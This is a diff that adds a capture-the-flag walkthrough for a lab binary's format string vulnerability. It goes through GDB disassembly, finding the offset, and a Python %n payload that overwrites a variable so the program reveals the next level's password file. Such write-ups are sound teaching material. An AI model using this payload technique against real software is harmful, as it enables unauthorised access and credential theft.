@@ -1,0 +1,60 @@
+# Level4 - Format String Vulnerability
+
+---
+
+#  Walkthrough
+
+## Step 1: Test the program
+```bash
+./level4
+hello
+hello
+```
+
+## Step 2: Confirm format string vulnerability
+```bash
+./level4
+%x %x %x %x
+b7ff26b0 bffff784 b7fd0ff4 0
+```
+
+**Vulnerable!**
+
+## Step 3: Analyze with GDB
+```bash
+gdb level4
+(gdb) disas n
+```
+
+Key lines:
+```asm
+mov    0x8049810,%eax     ; Load variable
+cmp    $0x1025544,%eax    ; Compare with 16930116
+call   system@plt        ; If equal, execute shell
+```
+
+## Step 4: Check what system executes
+```bash
+(gdb) x/s 0x8048590
+"/bin/cat /home/user/level5/.pass"
+```
+
+## Step 5: Find the offset
+```bash
+./level4
+AAAA %x %x %x %x %x %x %x %x %x %x %x %x %x
+AAAA b7ff26b0 bffff784 b7fd0ff4 0 0 bffff748 804848d bffff540 200 b7fd1ac0 b7ff37d0 41414141
+```
+
+`41414141` at **position 12**.
+
+## Step 6: Build the exploit
+```bash
+python -c 'print "\x10\x98\x04\x08" + "%16930112d" + "%12$n"' | ./level4
+```
+
+## Step 7: Get the flag
+
+Password appears after output.
+
+---
